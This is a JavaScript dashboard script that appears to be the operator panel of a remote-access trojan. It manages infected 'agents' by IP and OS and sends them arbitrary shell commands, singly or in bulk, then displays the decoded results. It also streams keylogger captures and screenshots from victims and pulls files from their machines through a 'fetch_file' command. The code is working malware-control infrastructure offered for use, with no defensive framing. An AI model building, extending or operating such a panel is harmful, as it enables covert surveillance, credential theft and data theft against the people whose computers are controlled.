// script.js

const baseURL = ""; // Same domain as backend
let selectedAgentId = null;
let allCommands = []; // Store all commands for filtering/export
let resultPollingInterval = null;
let lastShownResultId = null;
let keylogPollingInterval = null;
let selectedAgentIds = [];
let screenshotPollingInterval = null;
let lastScreenshotId = null;
let stompClient = null;


function base64Decode(str) {
  try {
    return atob(str);
  } catch (e) {
    return str;
  }
}

// Load agents on startup
// Load agents on startup
window.onload = () => {
  loadAgents();
  updateDashboardSummary();
  // ⬇️ Enter key se command send karne ke liye ye listener
  document.addEventListener("keydown", function (e) {
    const input = document.getElementById("newCommandInput");
    if (e.key === "Enter" && document.activeElement === input) {
      assignCommand();
    }
  });
  const savedTheme = localStorage.getItem('theme');
  if (savedTheme === 'light') {
    document.body.classList.add('light-mode');
    const themeIcon = document.getElementById('theme-icon');
    if (themeIcon) themeIcon.textContent = '🌞';
  }
};

function updateDashboardSummary() {
  // Total agents
  fetch(`${baseURL}/agents`)
    .then(res => res.json())
    .then(agents => {
      document.getElementById('summary-total-agents').textContent = agents.length;
    });

  // Pending commands
  fetch(`${baseURL}/commands`)
    .then(res => res.json())
    .then(commands => {
      const pending = commands.filter(c => (c.status || '').toUpperCase() === 'PENDING');
      document.getElementById('summary-pending-commands').textContent = pending.length;
    })
    .catch(() => {
      document.getElementById('summary-pending-commands').textContent = '0';
    });

  // Recent screenshots (last 24h)
  fetch(`${baseURL}/screenshots/`)
    .then(res => res.json())
    .then(screenshots => {
      const now = new Date();
      const last24h = screenshots.filter(s => {
        if (!s.time) return false;
        const t = new Date(s.time);
        return (now - t) < 24 * 60 * 60 * 1000;
      });
      document.getElementById('summary-recent-screenshots').textContent = last24h.length;
    })
    .catch(() => {
      document.getElementById('summary-recent-screenshots').textContent = '0';
    });
}

function loadAgents() {
  fetch(`${baseURL}/agents`)
    .then(res => res.json())
    .then(data => {
      const list = document.getElementById("agent-list");
      list.innerHTML = '';
      selectedAgentIds = [];
      data.forEach(agent => {
        if (!agent.agentId) return; // Skip agents with empty agentId
        const item = document.createElement("li");
        item.className = "list-group-item bg-dark text-light border-secondary d-flex justify-content-between align-items-center";
        item.onclick = function(e) {
          // Only select agent if not clicking the checkbox or delete button
          if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'BUTTON') {
            selectAgent(agent, item);
          }
        };
        // Highlight if this is the selected agent
        if (selectedAgentId === agent.agentId) {
          item.classList.add('selected');
        }
        item.innerHTML = `
          <div class="form-check">
            <input class="form-check-input" type="checkbox" value="${agent.agentId}" onchange="toggleAgentSelect(this, '${agent.agentId}')" id="agent-check-${agent.agentId}">
            <label class="form-check-label" for="agent-check-${agent.agentId}">
              ${agent.agentId} (${agent.agentOs})
            </label>
          </div>
          <button class="btn btn-sm btn-danger ms-2" title="Delete Agent" onclick="event.stopPropagation(); deleteAgent('${agent.agentId}')">🗑️</button>
        `;
        list.appendChild(item);
      });
      updateBulkActionButtons();
    })
    .catch(err => {
      console.error("Failed to load agents", err);
    });
}

function toggleAgentSelect(checkbox, agentId) {
  if (checkbox.checked) {
    if (!selectedAgentIds.includes(agentId)) selectedAgentIds.push(agentId);
  } else {
    selectedAgentIds = selectedAgentIds.filter(id => id !== agentId);
  }
  updateBulkActionButtons();
}

function updateBulkActionButtons() {
  document.getElementById('bulk-delete-btn').disabled = selectedAgentIds.length === 0;
  document.getElementById('bulk-command-btn').disabled = selectedAgentIds.length === 0;
}

function bulkDeleteAgents() {
  if (selectedAgentIds.length === 0) return;
  const modal = new bootstrap.Modal(document.getElementById('bulkDeleteModal'));
  modal.show();
}

function confirmBulkDelete() {
  const promises = selectedAgentIds.map(agentId =>
    fetch(`${baseURL}/agents/${agentId}`, { method: 'DELETE' })
  );
  Promise.all(promises)
    .then(() => {
      selectedAgentIds = [];
      loadAgents();
      updateDashboardSummary();
      const modal = bootstrap.Modal.getInstance(document.getElementById('bulkDeleteModal'));
      if (modal) modal.hide();
    });
}

function showBulkCommandModal() {
  if (selectedAgentIds.length === 0) return;
  document.getElementById('bulkCommandInput').value = '';
  const modal = new bootstrap.Modal(document.getElementById('bulkCommandModal'));
  modal.show();
}

function confirmBulkCommand() {
  const command = document.getElementById('bulkCommandInput').value.trim();
  if (!command) return;
  const promises = selectedAgentIds.map(agentId =>
    fetch(`${baseURL}/commands/assign`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ agentId, command })
    })
  );
  Promise.all(promises)
    .then(() => {
      const modal = bootstrap.Modal.getInstance(document.getElementById('bulkCommandModal'));
      if (modal) modal.hide();
      // Optionally, refresh commands for selected agent
      if (selectedAgentId) loadCommands();
    });
}

function deleteAgent(agentId) {
  if (!agentId) return;
  if (!confirm(`Are you sure you want to delete agent '${agentId}'?`)) return;
  fetch(`${baseURL}/agents/${agentId}`, {
    method: 'DELETE'
  })
    .then(res => {
      if (!res.ok) throw new Error('Failed to delete agent');
      loadAgents();
      updateDashboardSummary();
      // Optionally clear selection if deleted agent was selected
      if (selectedAgentId === agentId) {
        selectedAgentId = null;
        const selectedAgentElem = document.getElementById("selected-agent");
        if (selectedAgentElem) selectedAgentElem.innerText = 'Select an agent to view details';
        // Clear main panel tabs
        document.getElementById('commands').innerHTML = '';
        document.getElementById('results').innerHTML = '';
        document.getElementById('screenshots').innerHTML = '';
        document.getElementById('keylogger').innerHTML = '';
        hideAgentDetailsCard();
      }
    })
    .catch(err => {
      alert('Error deleting agent: ' + err.message);
    });
}

// In selectAgent, highlight the selected row
function selectAgent(agent, element) {
  selectedAgentId = agent.agentId;
  const selectedAgentElem = document.getElementById("selected-agent");
  if (selectedAgentElem) {
    selectedAgentElem.innerText = `Agent: ${agent.agentId}`;
  }
  // Show and populate agent details card
  const detailsCard = document.getElementById('agent-details-card');
  if (detailsCard) {
    detailsCard.style.display = '';
    document.getElementById('details-agent-id').textContent = agent.agentId || '';
    document.getElementById('details-agent-ip').textContent = agent.agentIp || '';
    document.getElementById('details-agent-os').textContent = agent.agentOs || '';
  }
  // Highlight selected
  document.querySelectorAll("#agent-list .list-group-item").forEach(i => i.classList.remove("selected"));
  if (element) element.classList.add("selected");
  loadCommands();
  loadResults();
  loadScreenshots();
  showLatestResultInTerminal();
}

// Hide agent details card when no agent is selected (after deletion)
function hideAgentDetailsCard() {
  const detailsCard = document.getElementById('agent-details-card');
  if (detailsCard) detailsCard.style.display = 'none';
  document.getElementById('details-agent-id').textContent = '';
  document.getElementById('details-agent-ip').textContent = '';
  document.getElementById('details-agent-os').textContent = '';
}

function loadCommands() {
  if (!selectedAgentId) {
    document.getElementById("commands-agent-id").textContent = "";
    document.getElementById("commandList").innerHTML = '<li class="list-group-item text-muted">⚠️ Select an agent from the sidebar first.</li>';
    return;
  }
  document.getElementById("commands-agent-id").textContent = selectedAgentId;
  fetch(`${baseURL}/commands/agents/${selectedAgentId}`)
    .then(res => res.json())
    .then(commands => {
      allCommands = commands.reverse();
      renderCommands(allCommands);
    });
  showLatestResultInTerminal();
}

function showLatestResultInTerminal() {
  const resultBox = document.getElementById("lastResultBox");
  if (!selectedAgentId || !resultBox) {
    if(resultBox) resultBox.style.display = "none";
    return;
  }
  fetch(`${baseURL}/results/agents/${selectedAgentId}`)
    .then(res => res.json())
    .then(results => {
      if (!results.length) {
        resultBox.textContent = "No result yet.";
        resultBox.style.display = "block";
        return;
      }
      const latest = results[results.length - 1];
      const newResult = base64Decode(latest.result);
      if (resultBox.textContent !== newResult) {
        resultBox.textContent = newResult;
        // Animation removed for instant update
        // resultBox.classList.remove('result-fade');
        // void resultBox.offsetWidth;
        // resultBox.classList.add('result-fade');
      }
      resultBox.style.display = "block";
      resultBox.scrollTop = resultBox.scrollHeight;
    })
    .catch(() => {
      resultBox.textContent = "No result yet.";
      resultBox.style.display = "block";
    });
}

function focusCommandInput() {
  setTimeout(() => {
    const input = document.getElementById("newCommandInput");
    if (input) input.focus();
  }, 0);
}

function assignCommand() {
  const input = document.getElementById("newCommandInput");
  const text = input.value.trim();
  if (!text || !selectedAgentId) return;

  fetch(`${baseURL}/commands/assign`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      agentId: selectedAgentId,
      command: text
    })
  })
  .then(res => res.text())
  .then(() => {
    input.value = "";
    startResultPolling();
    focusCommandInput();
    // No loadCommands() here to prevent result box flicker
  })
  .catch(err => console.error("Assign failed:", err));
}

// Patch loadCommands to focus input after rendering
const origLoadCommands = loadCommands;
loadCommands = function() {
  origLoadCommands();
  focusCommandInput();
}

function startResultPolling() {
  if (resultPollingInterval) clearInterval(resultPollingInterval);
  resultPollingInterval = setInterval(fetchAndShowLatestResult, 700);
}

function fetchAndShowLatestResult() {
  fetch(`${baseURL}/results/agents/${selectedAgentId}`)
    .then(res => res.json())
    .then(results => {
      if (!results.length) return;
      const latest = results[results.length - 1];
      if (lastShownResultId === latest.id || lastShownResultId === latest.commandId) return;
      lastShownResultId = latest.id || latest.commandId;
      const resultBox = document.getElementById("lastResultBox");
      if (resultBox) {
        resultBox.innerText = base64Decode(latest.result);
        resultBox.style.display = "block";
        resultBox.scrollTop = resultBox.scrollHeight;
      }
      updateCommandStatus(latest.commandId, "executed");
      setTimeout(() => {
        loadCommands();
      }, 500);
      clearInterval(resultPollingInterval);
    });
}






function updateCommandStatus(commandId, status) {
  fetch(`${baseURL}/commands/assign/${commandId}/${status}`, {
    method: "PUT"
  }).then(() => {
    setTimeout(() => {
      loadCommands(); // ✅ Ab command status dikhne lagega
    }, 300); // chhota delay for consistency
  });
}

function loadResults() {
  const container = document.getElementById("results");

  if (!selectedAgentId) {
    container.innerHTML = `<div class="alert alert-warning">⚠️ Select an agent from the sidebar first.</div>`;
    return;
  }

  container.innerHTML = `<h5>Results for Agent: ${selectedAgentId}</h5>
    <ul class="list-group" id="resultList"></ul>`;

  fetch(`${baseURL}/results/agents/${selectedAgentId}`)
    .then(res => res.json())
    .then(results => {
      const list = document.getElementById("resultList");
      if (!results.length) {
        list.innerHTML = `<li class="list-group-item text-muted">No results yet.</li>`;
        return;
      }

      results.reverse().forEach(result => {
        const item = document.createElement("li");
        item.className = "list-group-item bg-dark text-light border-secondary";
        item.innerHTML = `
          <strong>Command ID:</strong> ${result.commandId}<br>
          <pre class="mt-2">${base64Decode(result.result)}</pre>
          <button class="btn btn-sm btn-outline-light mt-2" onclick="navigator.clipboard.writeText(base64Decode('${result.result}'))">📋 Copy</button>
        `;
        list.appendChild(item);
      });
    });
}

function loadScreenshots() {
  const container = document.getElementById("screenshots");

  if (!selectedAgentId) {
    container.innerHTML = `<div class="alert alert-warning">⚠️ Select an agent from the sidebar first.</div>`;
    return;
  }

  container.innerHTML = `<h5>Screenshots for Agent: ${selectedAgentId}</h5>
    <div class="row" id="screenshotList"></div>`;

  fetch(`${baseURL}/screenshots/agent/${selectedAgentId}`)
    .then(res => res.json())
    .then(screenshots => {
      const list = document.getElementById("screenshotList");
      list.innerHTML = '';
      if (!screenshots.length) {
        list.innerHTML = `<div class="text-muted">No screenshots available.</div>`;
        return;
      }
      screenshots.reverse().forEach(shot => {
        const item = document.createElement("div");
        item.className = "col-md-4 mb-3";
        item.innerHTML = `
          <div class="card bg-dark text-light border-secondary">
            <img src="data:image/png;base64,${shot.screenshotData}"
                 class="card-img-top img-thumbnail"
                 alt="screenshot"
                 onclick="previewScreenshot('data:image/png;base64,${shot.screenshotData}')"
                 style="cursor: zoom-in;">
            <div class="card-body">
              <small class="card-text">ID: ${shot.screenshotId}</small>
            </div>
          </div>
        `;
        list.appendChild(item);
      });
    });
}

function renderCommands(filtered) {
  const list = document.getElementById("commandList");
  list.innerHTML = '';

  if (!filtered.length) {
    list.innerHTML = `<li class="list-group-item text-muted">No matching commands.</li>`;
    return;
  }

  filtered.forEach(cmd => {
    const item = document.createElement("li");
    item.className = "list-group-item bg-dark text-light border-secondary d-flex justify-content-between align-items-center";
    item.innerHTML = `
      <div>
        <strong>${cmd.command}</strong><br>
        <small>ID: ${cmd.commandId} | Status: ${cmd.status}</small>
      </div>
      <div>
        <button class="btn btn-sm btn-success me-1" onclick="updateCommandStatus('${cmd.commandId}', 'executed')">✔️</button>
        <button class="btn btn-sm btn-danger" onclick="updateCommandStatus('${cmd.commandId}', 'failed')">❌</button>
      </div>
    `;
    list.appendChild(item);
  });
}

function filterCommands(query) {
  const q = query.toLowerCase();
  const filtered = allCommands.filter(cmd =>
    cmd.command.toLowerCase().includes(q) ||
    cmd.commandId.toLowerCase().includes(q) ||
    cmd.status.toLowerCase().includes(q)
  );
  renderCommands(filtered);
}

function exportCommands() {
  if (!allCommands.length) {
    alert("No commands to export.");
    return;
  }

  const rows = ["CommandID,Command,Status"];
  allCommands.forEach(cmd => {
    rows.push(`"${cmd.commandId}","${cmd.command.replace(/"/g, '""')}","${cmd.status}"`);
  });

  const blob = new Blob([rows.join("\n")], { type: "text/csv" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `commands_${selectedAgentId}.csv`;
  a.click();
  URL.revokeObjectURL(url);
}

function previewScreenshot(base64Image) {
  const modalImg = document.getElementById("modalScreenshot");
  modalImg.src = base64Image;

  const modal = new bootstrap.Modal(document.getElementById("screenshotModal"));
  modal.show();
}

function fetchLatestResult() {
  fetch(`${baseURL}/results/agents/${selectedAgentId}`)
    .then(res => res.json())
    .then(results => {
      if (!results.length) return;
      const latest = results[results.length - 1];
      const decoded = base64Decode(latest.result);

      const box = document.getElementById("lastResultBox");
      box.innerText = decoded;
      box.style.display = 'block';
    })
    .catch(err => console.error("Fetching result failed:", err));
}

function fetchAndShowKeylogs() {
  if (!selectedAgentId) return;
  fetch(`${baseURL}/keylogger/live/${selectedAgentId}`)
    .then(res => res.json())
    .then(logs => {
      const box = document.getElementById('keylogLiveBox');
      if (!box) return;
      if (!logs.length) {
        box.textContent = 'No keylogs yet.';
        return;
      }
      // Show logs in reverse (oldest to newest)
      const lines = logs.slice().reverse().map(l => {
        const time = l.timestamp ? (l.timestamp.length > 19 ? l.timestamp.substring(0, 19).replace('T', ' ') : l.timestamp.replace('T', ' ')) : '';
        return `[${time}] ${l.logText}`;
      });
      box.textContent = lines.join('\n');
      box.scrollTop = box.scrollHeight;
    });
}

// Tab switch logic for screenshots and keylogger
const agentTabs = document.getElementById('agentTabs');
if (agentTabs) {
  agentTabs.addEventListener('click', function(e) {
    if (e.target && e.target.id === 'screenshots-tab') {
      // startScreenshotPolling(); // Removed polling
    } else {
      // stopScreenshotPolling(); // Removed polling
    }
    if (e.target && e.target.id === 'keylogger-tab') {
      // startKeylogPolling(); // Removed polling
    } else {
      // stopKeylogPolling(); // Removed polling
    }
  });
}
// Also start/stop polling on agent selection
const origSelectAgentForScreenshots = selectAgent;
selectAgent = function(agent, element) {
  origSelectAgentForScreenshots(agent, element);
  // Screenshots polling
  const screenshotsTab = document.getElementById('screenshots-tab');
  const screenshotsPane = document.getElementById('screenshots');
  if (screenshotsTab && screenshotsPane && screenshotsTab.classList.contains('active')) {
    // startScreenshotPolling(); // Removed polling
  } else {
    // stopScreenshotPolling(); // Removed polling
  }
  // Keylogger polling
  const keyloggerTab = document.getElementById('keylogger-tab');
  const keyloggerPane = document.getElementById('keylogger');
  if (keyloggerTab && keyloggerPane && keyloggerTab.classList.contains('active')) {
    // startKeylogPolling(); // Removed polling
  } else {
    // stopKeylogPolling(); // Removed polling
  }
  // Files polling (if needed)
  loadFiles();
};

function loadFiles() {
  const container = document.getElementById("fileList");
  if (!selectedAgentId) {
    container.innerHTML = '<li class="list-group-item text-muted">Select an agent first.</li>';
    return;
  }
  fetch(`${baseURL}/files/agent/${selectedAgentId}`)
    .then(res => res.json())
    .then(files => {
      container.innerHTML = '';
      if (!files.length) {
        container.innerHTML = '<li class="list-group-item text-muted">No files uploaded yet.</li>';
        return;
      }
      files.reverse().forEach(file => {
        const item = document.createElement('li');
        item.className = 'list-group-item d-flex justify-content-between align-items-center';
        item.innerHTML = `
          <span><strong>${file.originalFilename}</strong> <small class="text-muted">(${(file.size/1024).toFixed(1)} KB)</small></span>
          <a class="btn btn-sm btn-outline-primary" href="${baseURL}/files/download/${file.fileId}" target="_blank">Download</a>
        `;
        container.appendChild(item);
      });
    });
}

function uploadFile(event) {
  event.preventDefault();
  const input = document.getElementById('fileInput');
  if (!input.files.length || !selectedAgentId) return;
  const formData = new FormData();
  formData.append('file', input.files[0]);
  formData.append('agentId', selectedAgentId);
  fetch(`${baseURL}/files/upload`, {
    method: 'POST',
    body: formData
  })
    .then(res => res.text())
    .then(() => {
      input.value = '';
      loadFiles();
    });
}

// Load files when Files tab is activated
const filesTab = document.getElementById('files-tab');
if (filesTab) {
  filesTab.addEventListener('click', function() {
    loadFiles();
  });
}

// Also load files when agent is selected
const origSelectAgentForFiles = selectAgent;
selectAgent = function(agent, element) {
  origSelectAgentForFiles(agent, element);
  loadFiles();
  // No polling, WebSocket will trigger updates
};

function requestFileFromAgent(event) {
  event.preventDefault();
  const path = document.getElementById('remoteFilePath').value.trim();
  if (!path || !selectedAgentId) return;
  fetch(`${baseURL}/commands/assign`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agentId: selectedAgentId, command: "fetch_file " + path })
  })
  .then(res => res.text())
  .then(() => {
    document.getElementById('remoteFilePath').value = '';
    alert('File request sent to agent!');
  });
}

// Theme toggle logic
function toggleTheme() {
  const body = document.body;
  const themeIcon = document.getElementById('theme-icon');
  const isLight = body.classList.toggle('light-mode');
  if (themeIcon) themeIcon.textContent = isLight ? '🌞' : '🌙';
  localStorage.setItem('theme', isLight ? 'light' : 'dark');
  animateThemeChange();
}

function animateThemeChange() {
  document.body.style.transition = 'background 0.5s, color 0.5s';
  setTimeout(() => {
    document.body.style.transition = '';
  }, 600);
}

// Use Bootstrap tab events for more reliable polling
const screenshotsTabBtn = document.getElementById('screenshots-tab');
const screenshotsPane = document.getElementById('screenshots');
if (screenshotsTabBtn && screenshotsPane) {
  screenshotsTabBtn.addEventListener('shown.bs.tab', function() {
    // startScreenshotPolling(); // Removed polling
  });
  screenshotsTabBtn.addEventListener('hidden.bs.tab', function() {
    // stopScreenshotPolling(); // Removed polling
  });
}
// On page load, if screenshots tab is active, start polling
window.addEventListener('DOMContentLoaded', function() {
  const screenshotsTabBtn = document.getElementById('screenshots-tab');
  if (screenshotsTabBtn && screenshotsTabBtn.classList.contains('active')) {
    // startScreenshotPolling(); // Removed polling
  }
});

// In WebSocket event handler, update command list instantly on result
function connectWebSocket() {
  const socket = new SockJS('/ws');
  stompClient = Stomp.over(socket);
  stompClient.connect({}, function (frame) {
    stompClient.subscribe('/topic/events', function (message) {
      const event = JSON.parse(message.body);
      if (event.type === 'screenshot') {
        if (event.agentId === selectedAgentId) loadScreenshots();
      } else if (event.type === 'keylog') {
        if (event.agentId === selectedAgentId) fetchAndShowKeylogs();
      } else if (event.type === 'result') {
        if (event.agentId === selectedAgentId) {
          loadCommands();
          showLatestResultInTerminal();
          loadResults();
        }
      } else if (event.type === 'agent_status') {
        loadAgents();
      }
    });
  });
}

// Connect WebSocket on page load
window.addEventListener('DOMContentLoaded', function() {
  connectWebSocket();
  loadAgents();
  updateDashboardSummary();
});


